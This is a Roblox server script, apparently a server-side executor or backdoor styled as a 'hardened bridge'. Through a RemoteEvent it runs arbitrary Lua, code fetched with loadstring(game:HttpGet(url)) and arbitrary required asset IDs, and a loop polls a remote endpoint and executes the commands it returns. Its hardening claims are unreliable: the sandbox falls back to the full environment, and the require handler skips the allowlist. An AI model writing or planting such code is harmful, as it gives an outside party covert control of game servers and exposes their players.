-- ============================================================
--  Hardened Server Bridge - HackerAI Edition
--  Place as a Script in ServerScriptService
-- ============================================================

local RunService        = game:GetService("RunService")
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local CryptoService     = game:GetService("CryptoService")

if RunService:IsClient() then
    error("[Bridge] Server only!")
end

-- ============================================================
-- CONFIG
-- !! Replace with your real UserId !!
-- Find it in Studio command bar:
-- print(game.Players:GetUserIdFromNameAsync("YourUsername"))
-- ============================================================

local WHITELIST = {
    [10149136525] = true,
}

local RATE_LIMIT_MAX    = 8
local RATE_LIMIT_WINDOW = 4
local MAX_PAYLOAD       = 200000
local MAX_CACHE         = 50

-- Web API auth secret (GENERATE A RANDOM 64-CHAR STRING)
local API_SECRET = "replace-this-with-a-random-64-char-string-that-is-very-long-and-secure"
local API_URL    = "https://your-authenticated-endpoint.com/api/poll" -- Replace with real endpoint

-- ============================================================
-- REMOTE SETUP
-- ============================================================

local Remote = ReplicatedStorage:FindFirstChild("MangoRemote")
if not Remote then
    Remote = Instance.new("RemoteEvent")
    Remote.Name   = "MangoRemote"
    Remote.Parent = ReplicatedStorage
end

local moduleCache      = {}
local moduleCacheOrder = {}
local cacheSize        = 0
local rateLimiter      = {}
local BASE_ENV         = getfenv(1)

Players.PlayerRemoving:Connect(function(p)
    rateLimiter[p.UserId] = nil
end)

-- ============================================================
-- HELPERS
-- ============================================================

local function log(m) print("[Bridge] " .. tostring(m)) end
local function err(m) warn("[Bridge] "  .. tostring(m)) end

local function isWhitelisted(player)
    return WHITELIST[player.UserId] == true
end

local function isRateLimited(player)
    local now = tick()
    local uid = player.UserId
    local d   = rateLimiter[uid]
    if not d then
        rateLimiter[uid] = {count = 1, t = now}
        return false
    end
    if now - d.t > RATE_LIMIT_WINDOW then
        rateLimiter[uid] = {count = 1, t = now}
        return false
    end
    d.count = d.count + 1
    return d.count > RATE_LIMIT_MAX
end

-- ============================================================
-- HTTP FETCH (with HMAC authentication)
-- ============================================================

local function serverFetch(url, endpoint)
    if type(url) ~= "string" or not url:match("^https?://") then
        err("Invalid URL: " .. tostring(url))
        return nil
    end

    if #url > 1024 then
        err("URL too long: " .. #url .. " chars")
        return nil
    end

    log("Fetching: " .. url)
    local headers = {}
    
    -- Add HMAC auth if we have a secret configured
    if API_SECRET and API_SECRET ~= "replace-this-with-a-random-64-char-string-that-is-very-long-and-secure" then
        local timestamp = tostring(math.floor(tick()))
        local msg = (endpoint or url) .. ":" .. timestamp
        local signature = CryptoService:Sha256(msg .. ":" .. API_SECRET)
        headers["X-Auth-Timestamp"] = timestamp
        headers["X-Auth-Signature"] = signature
    end

    local ok, body = pcall(function()
        return HttpService:GetAsync(url, true, headers)
    end)
    if not ok then
        err("HTTP failed: " .. tostring(body))
        return nil
    end
    if type(body) ~= "string" or #body == 0 then
        err("Empty HTTP response")
        return nil
    end
    if #body > MAX_PAYLOAD then
        err("Response too large: " .. #body .. " bytes")
        return nil
    end
    log("Fetched " .. #body .. " bytes OK")
    return body
end

-- ============================================================
-- SANDBOX (Hardened)
-- ============================================================

-- Whitelisted Roblox services accessible via game:GetService()
local ALLOWED_SERVICES = {
    Players             = true,
    Workspace           = true,
    Lighting            = true,
    ReplicatedStorage   = true,
    ServerStorage       = true,
    ServerScriptService = true,
    HttpService         = true,
    RunService          = true,
    CollectionService   = true,
    Teams               = true,
    Chat                = true,
}

-- Whitelisted game keys
local ALLOWED_GAME_KEYS = {
    HttpGet             = true,
    Players             = true,
    Workspace           = true,
    Lighting            = true,
    ReplicatedStorage   = true,
    ServerStorage       = true,
    ServerScriptService = true,
    GetService          = true,
}

-- Allowed module IDs for require()
local ALLOWED_MODULES = {
    -- [123456789] = true, -- Uncomment and add specific module IDs
}

local function buildSandbox(player)
    local env = setmetatable({}, {__index = BASE_ENV})
    env.print        = print
    env.warn         = warn
    env.error        = error
    env.assert       = assert
    env.pcall        = pcall
    env.xpcall       = xpcall
    env.type         = type
    env.tostring     = tostring
    env.tonumber     = tonumber
    env.pairs        = pairs
    env.ipairs       = ipairs
    env.next         = next
    env.select       = select
    env.unpack       = unpack or table.unpack
    env.rawget       = rawget
    env.rawset       = rawset
    env.rawequal     = rawequal
    env.setmetatable = setmetatable
    env.getmetatable = getmetatable
    env.math         = math
    env.string       = string
    env.table        = table
    env.tick         = tick
    env.task         = task
    env.wait         = task.wait
    env.workspace    = workspace
    env.Players      = Players
    env.Instance     = Instance
    env.Color3       = Color3
    env.Vector3      = Vector3
    env.Vector2      = Vector2
    env.UDim2        = UDim2
    env.UDim         = UDim
    env.CFrame       = CFrame
    env.Enum         = Enum
    env.BrickColor   = BrickColor
    env.TweenInfo    = TweenInfo
    env.player       = player

    -- SAFE require wrapper - only allows specific module IDs
    env.require = function(id)
        if not ALLOWED_MODULES[id] then
            error("Module " .. tostring(id) .. " is not in the allowlist", 2)
        end
        return require(id)
    end

    -- SAFE loadstring wrapper - forces loaded function into sandbox
    env.loadstring = function(str)
        if type(str) ~= "string" then
            error("loadstring: expected string, got " .. type(str), 2)
        end
        if #str > MAX_PAYLOAD then
            error("loadstring: string too large", 2)
        end
        local fn, err = loadstring(str)
        if not fn then return nil, err end
        setfenv(fn, env)
        return fn
    end

    -- Hardened game proxy
    env.game = setmetatable({}, {
        __index = function(_, k)
            if k == "HttpGet" then
                return function(self, url)
                    return serverFetch(url) or ""
                end
            end
            if k == "GetService" then
                return function(self, serviceName)
                    if type(serviceName) ~= "string" then
                        error("GetService: expected string", 2)
                    end
                    if not ALLOWED_SERVICES[serviceName] then
                        error("Service '" .. serviceName .. "' is not allowed", 2)
                    end
                    return game:GetService(serviceName)
                end
            end
            if ALLOWED_GAME_KEYS[k] then
                return game[k]
            end
            error("Access to game." .. tostring(k) .. " is not allowed", 2)
        end,
        __newindex = function(_, k, v)
            error("Cannot modify game." .. tostring(k), 2)
        end,
        __call = function(_, ...)
            error("game() is not allowed", 2)
        end,
    })
    return env
end

-- ============================================================
-- EXECUTION ENGINE (with recursion guard)
-- ============================================================

local execDepth = 0
local MAX_EXEC_DEPTH = 3

local function execCode(code, player)
    if type(code) ~= "string" or #code == 0 then
        err("execCode: empty code")
        return
    end

    if #code > MAX_PAYLOAD then
        err("Code too large: " .. #code .. " bytes")
        return
    end

    if execDepth >= MAX_EXEC_DEPTH then
        err("Max recursion depth reached")
        return
    end
    execDepth = execDepth + 1

    log("Compiling " .. #code .. " bytes...")
    local fn, compileErr = loadstring(code)
    if not fn then
        err("Compile error: " .. tostring(compileErr))
        execDepth = execDepth - 1
        return
    end
    local sandbox = buildSandbox(player)
    setfenv(fn, sandbox)
    local ok, runtimeErr = pcall(fn)
    if not ok then
        err("Runtime error: " .. tostring(runtimeErr))
    else
        log("Executed successfully")
    end
    execDepth = execDepth - 1
end

-- ============================================================
-- MODULE CALLER
-- ============================================================

local function callModule(mod, player, extraArg)
    if type(mod) == "function" then
        local ok = pcall(mod, extraArg or player)

    elseif type(mod) == "table" then
        local methods = {
            "init","run","execute","load",
            "start","Begin","Start","Main","main"
        }
        for _, key in ipairs(methods) do
            if type(mod[key]) == "function" then
                log("Calling table method: " .. key)
                pcall(mod[key], mod, extraArg or player)
                return
            end
        end

    elseif type(mod) == "string" then
        execCode(mod, player)

    else
        err("Module returned unsupported type: " .. type(mod))
    end
end

-- ============================================================
-- REQUIRE HANDLER
-- ============================================================

local function handleRequire(player, idStr, extraArg)
    local assetId = tonumber(idStr)
    if not assetId then
        err("Invalid asset ID: " .. tostring(idStr))
        return
    end
    log("require(" .. assetId .. ") for " .. player.Name)

    if moduleCache[assetId] then
        log("Using cached module: " .. assetId)
        callModule(moduleCache[assetId], player, extraArg)
        return
    end

    local ok, result = pcall(require, assetId)
    if not ok then
        err("require(" .. assetId .. ") failed: " .. tostring(result))
        return
    end

    if cacheSize >= MAX_CACHE then
        local oldest = table.remove(moduleCacheOrder, 1)
        if oldest then
            moduleCache[oldest] = nil
            cacheSize = cacheSize - 1
        end
    end

    moduleCache[assetId] = result
    table.insert(moduleCacheOrder, assetId)
    cacheSize = cacheSize + 1
    log("Module " .. assetId .. " cached (type=" .. type(result) .. ")")
    callModule(result, player, extraArg)
end

-- ============================================================
-- PATTERN PARSER (Hardened)
-- ============================================================

local function parseAndExecute(player, text)
    if type(text) ~= "string" then
        err("Invalid input type from " .. player.Name)
        return
    end

    text = text:match("^%s*(.-)%s*$")
    if text == "" or #text == 0 then
        err("Empty input from " .. player.Name)
        return
    end

    if #text > MAX_PAYLOAD then
        err("Input too large: " .. #text .. " bytes")
        return
    end

    log("Parsing " .. #text .. " bytes from " .. player.Name)

    -- PATTERN 1: loadstring(game:HttpGet("url"))()
    do
        local url = text:match('loadstring%s*%(%s*game%s*[.:]%s*HttpGet%s*%(%s*"(.-)"%s*[,%)]')
                 or text:match("loadstring%s*%(%s*game%s*[.:]%s*HttpGet%s*%(%s*'(.-)'%s*[,%)]")
        if url then
            log("Pattern 1: loadstring(HttpGet) -> " .. url)
            local code = serverFetch(url)
            if code then execCode(code, player) end
            return
        end
    end

    -- PATTERN 2: require(id)("arg") or require(id)('arg')
    do
        local id, arg = text:match('^%s*require%s*%((%d+)%)%s*%((.-)%)%s*$')
        if id then
            local clean = arg:match("^%s*[\"']?(.-)%s*[\"']?%s*$") or arg
            log("Pattern 2: require(" .. id .. ")(" .. clean .. ")")
            handleRequire(player, id, clean)
            return
        end
    end

    -- PATTERN 3: require(id) no args
    do
        local id = text:match('^%s*require%s*%((%d+)%)%s*$')
        if id then
            log("Pattern 3: require(" .. id .. ")")
            handleRequire(player, id, nil)
            return
        end
    end

    -- PATTERN 4 (REMOVED - dangerous arbitrary method calling)

    -- PATTERN 5: local id = 123 / local user = "x" block
    do
        local idVal   = text:match('local%s+id%s*=%s*(%d+)')
        local userVal = text:match('local%s+user%s*=%s*"(.-)"')
                     or text:match("local%s+user%s*=%s*'(.-)'")
        if idVal and userVal then
            log("Pattern 5: local id=" .. idVal .. " user=" .. userVal)
            handleRequire(player, idVal, userVal)
            return
        end
    end

    -- PATTERN 6: raw URL
    if text:match("^https?://") then
        log("Pattern 6: raw URL")
        local code = serverFetch(text)
        if code then execCode(code, player) end
        return
    end

    -- PATTERN 7: raw Lua fallback
    log("Pattern 7: raw Lua")
    execCode(text, player)
end

-- ============================================================
-- MAIN EVENT LISTENER
-- ============================================================

Remote.OnServerEvent:Connect(function(player, action, data)
    if type(action) ~= "string" then return end

    log("RECV <- " .. player.Name
        .. " [" .. player.UserId .. "]"
        .. " action=" .. action
        .. " data=" .. tostring(data):sub(1, 60))

    if not isWhitelisted(player) then
        err("BLOCKED (whitelist): " .. player.Name
            .. " userId=" .. player.UserId)
        return
    end

    if isRateLimited(player) then
        err("BLOCKED (rate limit): " .. player.Name)
        return
    end

    if action == "REQUIRE" then
        handleRequire(player, tostring(data), nil)

    elseif action == "LOADSTRING" then
        parseAndExecute(player, tostring(data))

    elseif action == "CLEARCACHE" then
        moduleCache      = {}
        moduleCacheOrder = {}
        cacheSize        = 0
        log("Cache cleared by " .. player.Name)

    else
        err("Unknown action: " .. action)
    end
end)

-- ============================================================
-- STARTUP
-- ============================================================

log("Bridge online. Whitelist: " .. (function()
    local t = {}
    for id in pairs(WHITELIST) do
        table.insert(t, tostring(id))
    end
    return table.concat(t, ", ")
end)())

-- ============================================================
-- SECURED WEB POLL LOOP (HMAC Authenticated)
-- Only enabled if API_SECRET is configured
-- ============================================================

if API_SECRET ~= "replace-this-with-a-random-64-char-string-that-is-very-long-and-secure" then
    task.spawn(function()
        local endpoint = "/api/poll"

        while task.wait(3) do
            local timestamp = tostring(math.floor(tick()))
            local message = endpoint .. ":" .. timestamp
            local signature = CryptoService:Sha256(message .. ":" .. API_SECRET)

            local success, response = pcall(function()
                return HttpService:GetAsync(API_URL, true, {
                    ["X-Auth-Timestamp"] = timestamp,
                    ["X-Auth-Signature"] = signature,
                    ["X-Auth-User"] = "bridge",
                })
            end)

            if success and response and response ~= "none" then
                if type(response) == "string" and #response > 0 then
                    if #response <= MAX_PAYLOAD then
                        log("Web Command Received: " .. response:sub(1, 50))

                        local firstPlayer = Players:GetPlayers()[1]
                        if firstPlayer then
                            parseAndExecute(firstPlayer, response)
                        else
                            err("No players online to execute for")
                        end
                    else
                        err("Web response too large: " .. #response)
                    end
                end
            end
        end
    end)
else
    log("Web poll disabled - configure API_SECRET to enable")
end
